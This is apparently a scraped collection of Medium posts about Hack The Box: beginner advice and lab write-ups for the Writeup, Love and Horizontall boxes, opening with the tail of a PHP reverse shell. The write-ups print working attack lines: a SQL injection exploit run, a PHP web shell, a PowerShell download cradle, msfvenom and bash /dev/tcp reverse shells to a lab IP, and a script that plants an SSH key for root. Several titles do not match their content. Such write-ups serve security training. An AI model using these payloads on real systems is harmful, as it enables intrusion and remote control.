null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) {  if ($debug) printit(\"SOCK READ\");  $input = fread($sock, $chunk_size);  if ($debug) printit(\"SOCK: $input\");  fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) {  if ($debug) printit(\"STDOUT READ\");  $input = fread($pipes[1], $chunk_size);  if ($debug) printit(\"STDOUT: $input\");  fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) {  if ($debug) printit(\"STDERR READ\");  $input = fread($pipes[2], $chunk_size);  if ($debug) printit(\"STDERR: $input\");  fwrite($sock, $input); }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we've daemonised ourself// (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) { if (!$daemon) {  print \"$string\\n\"; }}?>\nI edited the following template in error.php:\nSet up a netcat listener on my attack machine:\nnc -lvp 1234"
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-2-13fa9db6a2d2",
        "content": "Hello hackers!!!As promised here’s the second part of my Unleash Your Inner Hacker: Where to Start in Hack The Box?\nIn the first part,we introduced the platform, we covered HTB Academy with suggested modules to get started right away. And above all, we talked about the importance of community.\nBear in mind that the tone of these articles should be perceived as a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking.\nHTB Meetup — Lisbon\nBy now you know that at the end of the day, it’s all about learning. You chose your HTB Academy modules, you studied them thoroughly you took your notes maybe you even attended a couple of meetups in person. You’re studying and practicing all of those concepts we talked about. But now you want to get down to business.\nslide from HTB — Lisbon meetup\nI’m with you. It’s time to get your feet wet. To get a real taste of things.\nwww.hackthebox.com/hacker/hacking-labs\nThese are virtual penetration testing labs, with simulating up-to-date security vulnerabilities and misconfiguration for you to train and explore.\nThis is the place where you’ll be testing the skills and knowledge you’ll acquire in your journey. What’s amazing about these labs is precisely the possibility of learning all the latest attack paths and exploit techniques. All in a safe, legal, and secure environment.\nI’m overwhelmed by the possibilities, so many options…\nEasy Elliot. The best place for your to start is precisely the STARTING POINT\nslide from HTB — Lisbon meetup\nThis is where you’ll learn the basics of Penetration Testing in an actionable, structured, comprehensive way. Yes, you’ll be hacking!\nThe machines/boxes you’ll be hacking in Starting Point are separated by Tiers according to their technical difficulty. Start with Tier 0 and build up from there.\nDoes this mean I will not need HTB Academy?\nHTB Academy will always be with you. As we discussed previously. Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. A valuable resource from beginners to seasoned experts.\nYou can pair your STARTING POINThacking withyourHTB Academy studies and modules. Every Tier has an associated module from HTB Academy, these will give you the guidance you’ll need regarding the technology and subjects you have to learn and master in order to solve those machines.\nwww.hackthebox.com/hacker/hacking-labs\nTake it slow and steady. Do it in a structured way. What I mean by this is to resist the urge to ‘jump’ from machine to machine if you encounter difficulties. Be sure to solve them in order.\nDo not expect to solve a machine quickly and easily. It’s supposed to be a challenge. If you’re not fully understanding what you’re dealing with I recommend taking a step back, reading, practice those HTB Academy once again.\nYou can always refer to the official Walkthroughs HTB made available for every machine on Starting Point. It’s okay to use them. These provide learning opportunities. Just make sure you do not follow them blindly. Try to understand the concepts behind every step. Study them. Reproduce the steps by yourself, and try to anticipate the next step.\nHow To Play Machines\nIf you want a full, comprehensive rundown of navigating and interacting with HTB Labs I suggest taking a look at How to Play Machines by Ryan Gordon.\nYou are not alone!\nRemember to join the HTB community:\nFeel supported, and get involved. Either on Discord, Forum, or join a meetup group. If you’re near Portugal, let’s connect and join the next in-person meetup.\nHack The Box Meetup: Portugal\nTo be continued…\nIn part 3 We’ll start to drill down on more HTB features and the next steps. Reach out and tell me if this is something it might interest you.\nHack all the things! Have all the fun! This is the way!\nDisclaimer! This writeup contains affiliate links."
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-1-994033ac3a6f",
        "content": "Writeup is an easy Linux box created by jkr on Hack The Box. The box has protections in place to prevent brute-force attacks. The skills required to complete this box are enumeration. The skills obtained from completing this box are process enumeration and path hijacking. Hello world, welcome to Haxez where today I will be explaining how I hacked the Hack The Box Writeup box.\nEnumerating Writeup\nFirst, I spawned the box and connected my attack box to the Hack The Box lab VPN. Next, I sent a ping to the target to ensure it was online and that I could talk to it. Once the box responded, I performed a Nmap scan targeting all ports. Furthermore, I also requested service versions, told it to run default scripts, gave it a minimum packet rate of 10,000, and told it to save the output in all formats named writeup. As you can see from the screenshot below, ports 22 for SSH and 80 for HTTP were open.\nsudo nmap -sC -sV -p- 10.129.95.203 --min-rate 10000 -oA writeup\nWeb Application Enumeration\nSince SSH was unlikely to be the intended attack vector, I moseyed on over to the web application for a gander. It’s… beautiful! The web application appeared to be an in-development blog for Hack The Box writeups. However, the application was being hit with denial-of-service attacks resulting in DoS protection mechanisms being implemented. The DoS protection blocks any IP that triggers a 400 error in the Apache log.\nDomo arigato, Mr Roboto\nDirb, gobuster, ffuf, and other directory and file brute force tools are noisy and would generate 400 errors resulting in an IP ban. Therefore, I had to manually and carefully enumerate the web application. One of the first files I look for when hacking web applications is the robots.txt file. It’s a file that tells search indexing robots to ignore the files contained within it. It prevents pages like admin or log-in from being indexed. However, it’s a double-edged sword as it may disclose sensitive information to malicious threat actors. Navigating to the robots.txt file I found a directory called writeup.\nEnumerating Writeup Technologies\nI navigated to the writeup directory which presented a basic web application with minimal functionality. There were several links to blog posts and clicking on those blog posts revealed that it was a PHP-based application. Furthermore, a parameter named page was being used to retrieve the blog posts. For example, visiting the following URL would retrieve a blog post called blue http://10.129.95.203/writeup/index.php?page=blue. I used whatweb to identify the CMS or Content Management System. As a result, I learned that it was using a version of CMS-Made-Simple from 2004–2019.\nFurthermore, looking at the structure of the CMS I found the location of the changelog file. Navigating to the file revealed the specific version of the CMS being used.\nCMS Made Simple Blind SQL Injection Failures\nUsing searchsploit to search for vulnerabilities impacting CMS Made Simple, I found a blind SQL injection vulnerability. The vulnerability has a CVE designation of CVE-2019–9053. I located the Python script and copied it to my current working directory. You can do this with the searchsploit -m flag to mirror it.\nUnfortunately, attempting to run this exploit produced errors regarding print statements. I wasn’t sure what to do here as I’m crap at Python. Fortunately, IppSecs video explained that I needed to install the termcolor module with pip. While this didn’t resolve the problem, it did point me in the right direction.\nFirst, I had to install pip2.7 which I was able to do by following the post >>HERE<<\nwget https://bootstrap.pypa.io/pip/2.7/get-pip.pysudo python2.7 get-pip.py\nHowever, when attempting to install termcolor, I received errors about an egg or something. After a bit more Google searching, I found this post >>HERE<< which explained I needed to upgrade setuptools.\npip install --upgrade setuptools\nCMS Made Simple Blind SQL Injection Success\nI was finally ready to run the payload. Using the following command, I was able to attack the SQL injection vulnerability and retrieve a salt, username, email address, and password hash. It was awesome watching the script come alive and iterate through the alphabet and pull the information out of the database.\npython2.7 46635.py --url http://10.129.95.203/writeup\nWriteup Foothold\nI echoed the hash followed by a colon, followed by the salt into a file called jkrhash.txt.\necho '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > jkrhash.txt\nNext, I used hashcat with mode 20 (MD5 salt and password) to crack the hash with the wordlist rockyou.\nhashcat -a 0 -m 20 jkrhash.txt /usr/share/wordlists/rockyou.txt\nI was in, I was able to use the credentials to SSH to the box as the jkr user. Furthermore, once on the box, I was able to capture the user flag.\njkr@writeup:~$ cat user.txt8d0▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓9e9\nWriteup System Enumeration\nAfter grabbing the user flag, I started enumerating the system. First, I checked the command history of the jkr user to see if it contained anything interesting. It didn’t. Next, I checked if I could run sudo -l to see what commands jkr could run as sudo. Interestingly, sudo wasn’t found on the system. Finally, I decided to go for the easy option and ran linpeas. I span up a Python webserver and used wget to download it to the /tmp directory. Then, I gave it executable permissions and ran it.\nThe output kept highlighting the /usr/local path as a privilege escalation vector but I didn’t know why. After a bit more investigation, it seems that the jkr user is part of the staff group. According to the Debian wiki the staff group allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may “override” the executables in /bin and /usr/bin with the same name). As you can see from the screenshot below, /usr/local/bin is also the first path that gets called when executing files.\nWriteup Process Enumeration\nI’m still getting my head around this privilege escalation method if I’m honest. However, I think I understand it. To explain, the jkr user is a member of the staff group and the staff group has the ability to modify /usr/local/ without root privileges. If I can find a binary that gets executed as root without it using the absolute file path, then I can drop a malicious binary of the same name inside the /usr/local/bin directory. Then, when the conditions are met for the binary to be executed, my malicious binary gets executed with root privileges because my first environmental path is /usr/local/bin.\nWith that in mind, I ran pspy32 and found that when I log in to SSH with jkr, the run-parts binary is executed without an absolute file path. You can see it in the image below, the third blue line from the bottom.\nNext, I checked to see the ownership of the run-parts binary to see if it was owned by root. I used which to locate it and then ran ls -lash to list the permissions. Sure enough, it was owned by root and genuinely appeared to be the only binary not being executed with a full file path.\nWriteup Privilege Escalation\nIn theory, I should now be able to create my own binary or script called run-parts in /usr/local/bin. Then when I SSH to the system as jkr, my malicious run-parts binary will be executed instead of the one in /bin. There are multiple methods that I could have used to do this. For example, I could have created a script that copied the bash binary to /tmp and gave it setuid capabilities (I think). Additionally, I could have created a reverse shell that connected back to my machine. However, I thought the most reliable method was to drop an SSH key in the root user’s authorized_keys file. Plus, this is the method that IppSec used and it seemed to work.\nWhen the script is executed, it creates a file in /tmp called Exploit-Complete. This isn’t required as it’s just a visual indicator to show that the script was executed. Next, it creates the .ssh directory in the root user’s directory. Then, it echos my public key into the root user’s authorized_keys file. Finally, it gives the file 600 permissions. The script is saved as run-parts and saved to /usr/local/bin. I created it using nano.\n#!/bin/bashtouch /tmp/Exploit-Completemkdir /root/.sshecho 'ssh-rsa AAAA <<<SNIP>>> QqNzw9WKiU0= kali@kali' >> /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys\nOnce the file was saved, I made it executable by running chmod +x against it. Then I created a new terminal tab and connected back to the box as the jkr user. I checked the /tmp directory and sure enough, the Exploit-Complete file had been created. Hopefully, that means that my public key is now in the root user’s authorized_keys files.\nFinally, I connected SSH as the root user using the private key I generated. I was able to login and grab the root flag.\n┌──(kali㉿kali)-[~/HTB/Writeup]└─$ ssh -i root root@10.129.95.203Last login: Fri Aug  6 08:59:19 2021root@writeup:~# cat root.txt786▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓4b4\nWriteup Learnings\nThis was a fun box which I learned a few things from. The first was getting the Python SQL injection payload to work. As soon as I received that first error I immediately thought that I wasn’t going to be able to complete the box. However, after a bit of persistence, the payload worked and left me with a big grin on my face. The cracking was fairly simple but always good to get some practice.\nThe system enumeration and privilege escalation was interesting. I didn’t know about the staff group before and without guides pointing me in the right direction, I wouldn’t have got it. I’m starting to understand the brilliance of pspy too, without it, I’m not sure how I would have identified the correct binary. Overall this is a good box and has a nice method for practicing different techniques for privilege escalation. You could change your binary to perform different things and then easily trigger it by connecting back to the box. Thanks, jkr, fun box."
    },
    {
        "title": "Hack The Box Writeup Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-writeup-writeup-338083ef9057",
        "content": "In our previous Hack The Box in-person meetups in Lisbon and Oporto I had the opportunity of presenting HTB in all its splendor. We talked about #hackthebox history, what hacking is, where to start, how to learn, and the importance of the community.\nThe response was overwhelming. It was amazing to get together with experienced professionals and newcomers, we created an environment where everyone felt supported and welcomed.\nHTB Meetup — Lisbon\nHTB Meetup — Oporto\nFollowing these last couple of events, I got a lot of requests to suggest a kind of “roadmap” for those complete beginners in hacking and HTB.\nI decided to write a couple of articles suggesting my approach to HTB and hacking. Take these and they are, personal and subjective. This aims to be a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking that is.\nThis is the first part of our convo. I’ll be covering HTB Academy and leave you with a cliffhanger.\nI’m not going to talk about what is hacking. As we presented on our meetup r0adrunn3r from HTB did that in a stellar way in her impressive How to learn hacking: The (step-by-step) beginner’s bible for 2023.\nhackthebox.com/blog/learn-to-hack-beginners-bible\nStart here:\nThat’s the place to start if you’re a complete beginner. Start there and read it. Get fundamental answers for questions like:\n* What is hacking?\n* Can anyone learn how to hack?\n* Where should beginner hackers start? and many more.\nThe article is written in a way that’s informative and makes you feel welcomed and supported. She even discusses the hats hackers should be wearing. If you know me you know my take on that:\nhttps://www.hackthebox.com/blog/htb-community-manifesto , slide from HTB — Lisbon meetup\nRead the Community Manifesto:\nHTB is all about the importance of the community. A happy, non-toxic, open, educational, active, and passionate society for hackers.\nIt’s our ultimate responsibility to ensure our values. Promote respect and a safe place. We all are learners, we all struggle from time to time. In such a highly demanding field as cybersecurity, it’s essential to foster a helpful and supportive community. That’s the only way to grow and learn.\nTalk about learning:\nLearning in everything. This journey is above all about learning. So having a mindset where acquiring knowledge is your reward will help you in the long run.\nYou’ve seen the memes:\nGot this from a web search, there was no explicit author.\nI bet you can do the splits, but even Jean Claude Van Damme didn’t skip the fundamentals. Why should you?\nFundamentals! Fundamentals! Fundamentals! — HTB Academy\nThat’s right. Start learning now. Start with the fundamental cybersecurity skills. This is the beginning of your journey into hacking and the world of cybersecurity. Make sure you start with the proper foundations.\nCreate an account on Hack The Box Academy, this is without a doubt the perfect place for you to start. From complete beginners to seasoned professionals I can guarantee you that this is a resource you’ll be using throughout your career.\nHTB — Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. Where should you start?\nHacker meets HTB — Academy, HTB — Academy this is hacker:\nGet acquainted with the platform and the learning process. This module will welcome you and guide you at the beginning of your learning journey at the Academy. Think of this as the tutorial stage of your favorite game.\nGot it! What’s next?\nLearn how to learn — the starting module:\nLearning Process created by Cry0l1t3\nIn this demanding and ever-changing field, prepare yourself for neverending study. Having methodologies and processes will not only optimize your learning but ensures your mental safety. Protect yourself from burnout, impostor syndrome… Be prepared. The amount of information can be overwhelming when you first start so you must keep yourself organized. Also, frustration is going to creep up on you, better be prepared to deal with it.\nTake notes:\nThat reminds me. Always take notes! I mean ALWAYS (yea, all caps). Start now, make it a habit. Take notes now, while learning. Take notes later, while hacking. This will not only improve your concept retention but you’ll be creating your knowledge base you can always refer to.\nChoose a note-taking app and start now:"
    },
    {
        "title": "Hack The Box Love Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-love-writeup-d58982ffa4ec",
        "content": "Love is an easy Windows box created by pwnmeow on Hack The Box and was released on the 1st of May 2021. Hello world, welcome to Haxez where today I will explain how I hacked Love. To hack this box is it recommended that you have Windows enumeration and web enumeration skills. From hacking this box, you will learn exploit modification, server-side request forgery, applocker policies, and always install everything misconfiguration.\nLove Enumeration\nAfter spawning the box, I sent a single ping request to ensure it was online. I then followed up with a Nmap scan targeting all ports, requesting service versions, and running default scripts. Finally, I gave it a minimum packet rate of 10000 and said to output all formats. From the results, I learnt that there were several ports open. This included various ports for HTTP, 445 for SMB, 3306 for MySQL, 5985 and 5986 for HTTPAPI or WinRM, the list goes on.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nmap -sC -sV -p- 10.129.48.103 --min-rate 10000 -oA love\nAs SMB was listening, the first thing I did was run crackmapexec to enumerate shares and host information. From the results, I learnt that it was a Windows 10 Pro box with the hostname LOVE. The domain was also called Love which suggests the box is not a domain controller (as they have the same name). Furthermore, SMBv1 was enabled.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ crackmapexec smb 10.129.48.103\nLove Web Application Enumeration\nAfter poking SMB, I went to take a look at the web application. First, I visited the application in my browser and saw that it was a type of voting application. Next, I appended various extensions to the end of the index page. As a result, I learnt that the application was written in PHP.\nFollowing that, I ran whatweb against the application and learnt that the PHP version was 7.3.27. Furthermore, I also learnt that the Apache version was 2.4.46 and that the application was using the Bootstrap framework.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo whatweb -a3 http://10.129.48.103/ -v\nI also ran a gobuster scan to try to identify any directories or files that would disclose sensitive information about the application. However, other than some 301 and 302 redirections and a bunch of 403 errors, I didn’t find much.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ gobuster dir -u http://10.129.48.103/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,txt,bak -o gobuster.love.txt\nMore Love Application Enumeration\nI decided to look at the other HTTP ports that were discovered during the Nmap scan. Therefore, I punched the IP address of the box into my browser and specified port 5000. Immediately, I received a Forbidden error. I shouldn’t have been surprised by this as Nmap displayed the forbidden error in the results.\nSubdomains and Virtual Hosts\nI revisited the results of the Nmap scan to choose which service to poke at next. It was then that I noticed the common name of the SSL certificate on port 443. Below, you can see the output from the Nmap scan showing the subdomain of staging.love.htb.\nImmediately, I excitedly added the IP address and new subdomain to my host file. Surely this was the foothold that I’d been looking for. Finally, I found a weakness in this box’s armour! I entered the domain into my browser and…. Forbidden. Wow, talk about rejection.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ echo '10.129.48.103 staging.love.htb' | sudo tee -a /etc/hosts\nHowever, visiting the subdomain via HTTP instead of HTTPS loaded a page. I poked around the application for a bit and noticed a demo page. In short, the demo page is a free file scanner that allows the user to submit a URL with a file for scanning.\nServer-Side Request Forgery\nI wanted to see if the demo page worked so I set up a netcat listener on my local machine. Next, I input the location of a file into the Scan File input box and sent the request. Sure enough, the application pulled the file down from my host and displayed the contents. Admittedly, my first thought was to try and get it to execute a payload by downloading it from my host. However, those attempts failed.\nThere is a Web Application vulnerability known as Server Side Request Forgery. In short, SSRF exploits the box’s own trust. Because the resource request is sent from the box itself, it may allow access to otherwise forbidden files. To illustrate, I input the loopback address of 127.0.0.1 followed by port 5000 into the URL box. This was the page I was previously unable to access. Upon sending the request, I received credentials.\nVoting System Admin\nWith the username and password successfully stolen via SSRF, I headed back to the voting system by navigating to the IP address. Next, I supplied the stolen credentials and… they didn’t work. This is another one of those easy boxes which seems more difficult than it is because it takes so long.\nFortunately, I ran a gobuster earlier and remember seeing a 301 redirection from /admin to /admin/. This is where gobuster attempted to load a file called admin but was redirected to a directory called admin, likely containing a PHP file. Therefore, I headed to the admin directory and was able to log in with the credentials.\nLove RCE POC\nI noticed the Copyright disclaimer at the bottom of the page and decided to perform a Google search for the name SourceCodeStar. After a few Google searches, I stumbled upon several Exploit Database pages which suggested there was an authenticated remote code execution. Unfortunately, there didn’t appear to be a CVE number associated with it.\nAdmittedly, I wanted some guidance on this step so I am going to copy what IppSec did >>HERE<<. First, I navigated to the Voters menu option and clicked the New button. This spawned the window you see below. I populated the window with some test data and selected a jpeg file for the photo.\nNext, I turned intercept on and clicked the save button. Burp successfully intercepted the request which I then modified. I changed the filename to “haxez.php” and then removed the jpeg data and replaced it with a PHP web shell.\n------WebKitFormBoundaryM93O7d6XpEp6S0dPContent-Disposition: form-data; name=\"photo\"; filename=\"haxez.php\"Content-Type: image/jpeg<?php system($_REQUEST[\"cmd\"]); ?>\nThen, I navigated to the payload in my browser and passed the dir command to the cmd parameter. It successfully listed out the contents of the directory.\nLove Foothold\nNow that I had command execution, it was time to get on the box using a reverse shell. I downloaded nishang from >>HERE<< and copied the Invoke-PowerShellTcpOneLine.ps1 payload to my current working directory. Next, I opened the payload with VIM and changed the IP address and port to my tun0 IP address and port 9001.\nThen, I sent my original directory listing request to Burp repeater and changed the request method to a POST. Next, I started a netcat listener and then added the following Payload to Burp and sent the request. I instantly received a 404 error. There must be a clean-up script on the box that is removing the payloads.\ncmd=powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/hax.ps1')\"\nI quickly repeated the process by uploading a new command shell and executing the above payload. Finally, I got a reverse shell and had a foothold on the box. From here, I was able to grab the user flag from the phoebe users desktop directory.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9001                                             [sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59730PS C:\\xampp\\htdocs\\omrs\\images> whoamilove\\phoebePS C:\\xampp\\htdocs\\omrs\\images> type C:\\Users\\phoebe\\Desktop\\user.txtd85▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓319\nLove Privilege Escalation\nAfter capturing the user flag, I download the latest version of the 64 bit obfuscated WinPEASS binary. Next, I spawn a Python3 web server and used cURL to download the binary to the target machine. Finally, I ran the executable and saw that the AlwaysInstallElevated value was set to 1 which I presume means it was enabled. Quoting directly from the HackTricks article “If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\\SYSTEM.”. Is this a useful setting to have as a sysadmin? it seems a bit odd.\nWith this knowledge, I went back to my Linux terminal and used msfvenom to create an MSI payload. The output below will create a Windows x64 reverse shell that connects back to my local host on port 9002. The file type is specified as an MSI file and I saved the output to payload.msi.\n┌──(kali㉿kali)-[~/HTB/Love]└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9002 -f msi > payload.msi\nI set up a netcat listener to listen on port 9002 and then used cURL to download the payload from the Python web server I still had running. I specified the -o flag to save the payload as payload.msi.\nPS C:\\users\\public\\documents> curl http://10.10.14.36/payload.msi -o payload.msiPS C:\\users\\public\\documents> .\\payload.msi\nFinally, I ran the payload and thankfully, I received a connection back to the netcat listener. I now had a reverse shell as the nt authority\\system user and could finally capture the root flag.\n──(kali㉿kali)-[~/HTB/Love]└─$ sudo nc -lvnp 9002                                           [sudo] password for kali: listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.48.103] 59734Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32>type \\users\\administrator\\desktop\\root.txttype \\users\\administrator\\desktop\\root.txt64b▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓95f\nLove Learnings\nLove requires patience… the initial enumeration stage of this box took longer than I had hoped. It felt like I was jumping through hoops but it taught me valuable lessons about enumeration. It’s one of those boxes that seemed difficult due to the level of enumeration required to get a foothold, but the actual exploit is easy. Furthermore, it does a great job of demonstrating Server Side Request Forgery which I hadn’t really done before.\nThe privilege escalation was a lot of fun and fairly simple to pull off. I didn’t know about this method of privilege escalation until today so I’ve learnt that too. Overall it’s a fun box but it definitely tested my patience at times. My initial PHP shell just up and vanished so I had to upload that again before getting my reverse shell. For me, it was educational and taught me new techniques which is what I want from an easy box. Thanks for the box."
    },
    {
        "title": "Hack The Box Horizontall Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-horizontall-writeup-4f10ec21a949",
        "content": "Horizontall is an easy Linux box created by wall99 on Hack The Box and was released on the 28th Aug 2021. Hello world, welcome to haxez where today I will be going through how I hacked Horizontall. To complete this box it is suggested that you have basic Web Enumeration, Linux Enumeration, and SSH Knowledge. The lessons from this box are Source Code Review and Port Forwarding.\nHorizontall Enumeration\nTo ensure that the box was online and that I could talk to it, I sent a ping request. Since the box responded, I performed a Nmap scan against all ports, with default scripts and requested service versions. As a result, I learnt that ports 22 for SSH and 80 for HTTP were open.\nHorizontall Application Enumeration\nNavigating to the IP address in my browser, I was redirected to the domain horizontall.htb. However, as this domain name doesn’t resolve through DNS I received an error from Burp.\nTo fix this, I echoed the box’s IP address and domain name into my host’s file. As a result, when visiting the domain name the application loaded as expected. The web application appeared to be a commercial website for a website development company. However, the website wasn’t functional as the links and the contact us form didn’t work.\n┌──(kali㉿kali)-[~]└─$ echo \"10.129.234.11 horizontall.htb\" | sudo tee -a /etc/hosts\nNext, I ran whatweb but it didn’t reveal much about the application that Nmap hadn’t already told me. It told me the server was Ubuntu and that the web server was nginx.\n┌──(kali㉿kali)-[~]└─$ whatweb http://horizontall.htb/\nI ran 2 gobuster scans, 1 to look for directories and 1 to look for virtual hosts but unfortunately, neither produced anything interesting. I think I’m running gobuster incorrectly for virtual hosts. I believe there is an –append-word argument that needs to be added but I get an error when doing that. I will have to look into that this evening.\n┌──(kali㉿kali)-[~]└─$ gobuster vhost -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -o vhostgobuster.txt -t 50\nHowever, ffuf does find the virtual host. I filtered by a file size of 194 because that was the file size of the generic error response. I’m doing something wrong with gobuster. Since I wouldn’t have found the virtual host, I’m going to ignore these results and continue enumerating. I’m going to search the academy for gobuster this evening.\n┌──(kali㉿kali)-[~]└─$ sudo ffuf -u http://horizontall.htb/ -H \"Host: FUZZ.horizontall.htb\" -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 194\nReturn To The Source\nIt’s where one must go when they’ve run out of ideas. As you can see below, there were references to Cascading Style Sheet files and Javascript files. I decided to take a look at the Javascript files to see if they contained anything interesting.\nHowever, the way the browser rendered the code was horrible so I went to https://beautifier.io/ and pasted in the Javascript. Skimming through the code, I noticed a function called getReviews which pointed to the subdomain api-prod.\nAPI Virtual Host Enumeration\nAfter adding the new virtual host to my host file, I navigated to it in my browser. There wasn’t much to look at other than a welcome message.\nI’m pleased to say that gobuster worked for directory brute forcing. It seems there were 3 subdirectories.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://api-prod.horizontall.htb/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\nI navigated to the admin directory which rendered a login page. The page revealed that the technology in use was strapi. Next, I visited the reviews page which returned a JSON response from the server showing reviews of the product.\nFollowing the discovery of the technology, I searched for exploits on Exploit Database and found an RCE. In short, the exploit performs a password reset. It’s written in Python and exploits the vulnerability with the CVE designation CVE-2019-18818. The CVE description explains the following.\nstrapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.\nTherefore, I navigated to the /admin/init endpoint to retrieve the service version to determine whether it was vulnerable. The API reported back that it was version 3.0.0-beta.17.4 which suggested it should be.\nHorizontall Foothold\nDon’t you just love it when an exploit just works without having to tinker with it? I copied the code and recreated it locally in a file called exploit.py. Next, I used Python3 to run the code and fed it the URL of the application. Almost immediately, the exploit told me that the password was reset successfully.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ python3 exploit.py http://api-prod.horizontall.htb/\nJust like that, I had code execution and could send myself a reverse shell. First, I set up a netcat listener on my attack box. Next, I ran the following command in the shell on the target machine. Finally, I landed on the box as the strapi user and was able to grab the user flag.\nbash -c 'bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'┌──(kali㉿kali)-[~]└─$ sudo nc -lvnp 9001[sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 46802strapi@horizontall:~/myapi$ ls /homels /homedeveloperstrapi@horizontall:~/myapi$ cat /home/developer/user.txtcat /home/developer/user.txt6e7▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓dc0strapi@horizontall:~/myapi$\nHorizontall Authenticated Enumeration\nFirst, I wanted to establish persistence on the host so I created a .ssh directory in /opt/strapi/.ssh. Next, I created an SSH key using ssh-keygen and echoed the public key into the authorized_keys file. Finally, I gave the SSH private key 600 permissions and used it to SSH to the host. Once I was back on the host I enumerated the listening services and discovered that port 8000 and MySQL were listening locally.\nFirst, I decided to try and get access to MySQL. Starting at the /opt/strapi/ directory, I ran a recursive grep for the word password but was bombarded with noise. After jumping around a few directories I finally found the database password.\nstrapi@horizontall:~/myapi/config$ grep -R passwordenvironments/production/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",environments/development/database.json:        \"password\": \"#J!:F9Zt2u\"environments/staging/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",\nAs a result, I was able to log in to the MySQL database as the development user but this appeared to be a dead end. I queried the database and dumped the contents of the various user tables but couldn’t find any hashes other than the administrators.\nSince MySQL was a dead end, I moved on to see what was listening on port 8000. Using SSH, I performed local port forwarding so that I could access port 8000 via localhost:1234. Upon visiting that port I found a Laravel application.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ ssh -L 1234:localhost:8000 -i key strapi@10.129.234.11\nI ran gobuster to discover directories and was able to identify the /profiles directory. However, the box crapped out shortly after and killed my tunnel.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://localhost:1234/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words.txt\nI recreated the tunnel and navigated to the profiles directory. The application appeared broken and had visual debugging enabled. Searching Google for Laravel Debug exploits resulted in finding this payload >>HERE<<which I recreated locally.\nHorizontall Privilege Escalation\nI ran the exploit using the syntax below and the results indicated that Laravel was running as root. I was almost there, all I needed to do now was craft a reverse shell and send it back to myself.\n┌──(kali㉿kali)-[~/HTB/Horizontall/laravel]└─$ python3 exploit.py http://localhost:1234 Monolog/RCE1 id\nI was close to getting it right the first time. You can see from the screenshot below the different payloads I tried before resuming IppSec’s video. I attempted the first two on my own before resuming the video but as soon as he said curl, I paused it again and executed the payload myself. Little victories.\nI created a shell script which contained the following bash script. I then used the exploit with curl to download the file which I then piped to bash to execute it.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ cat shell.sh      #!/bin/bashbash -i >& /dev/tcp/10.10.14.36/9002 0>&1\nBelow, you can see the exact command I used. It needed to be enclosed in single quotation marks. If medium will let me include it that is.\nThis connected back to my netcat listener and allowed me to capture the root flag.\n┌──(kali㉿kali)-[~]└─$ nc -lvnp 9002listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 42330bash: cannot set terminal process group (65829): 